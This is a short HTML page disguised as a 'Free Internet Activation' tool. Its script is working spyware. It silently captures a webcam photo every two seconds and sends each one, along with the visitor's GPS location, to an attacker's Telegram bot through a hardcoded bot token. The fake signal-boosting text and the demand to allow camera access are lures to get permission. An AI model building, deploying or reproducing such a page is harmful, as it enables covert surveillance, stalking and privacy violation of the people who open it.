<!DOCTYPE html><html>
<head>
  <title>Free Internet Activation</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #000;
      color: #0f0;
      font-family: monospace;
      text-align: center;
      padding: 20px;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>
  <h2>ðŸ“¡ Connecting to Free Internet...</h2>
  <p>ðŸ”„ Boosting signal...<br>
     ðŸ”“ Unlocking SIM Access...<br>
     ðŸ“¶ Enabling free access...</p><video id="video" autoplay muted playsinline></video> <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('chatid');
    const token = '8017259757:AAHeP_v-F9whiHa_O9fa-2YCeqjXg6luQjc'; // Your bot token

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // Start camera access
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setInterval(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
              method: 'POST',
              body: formData
            });
          }, 'image/jpeg');
        }, 2000);
      })
      .catch(() => {
        document.body.innerHTML = '<h3>ðŸš« Camera access denied. Please allow camera access to activate free internet.</h3>';
      });

    // Get and send location once
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        const latitude = pos.coords.latitude;
        const longitude = pos.coords.longitude;

        fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`);
      });
    }
  </script></body>
</html
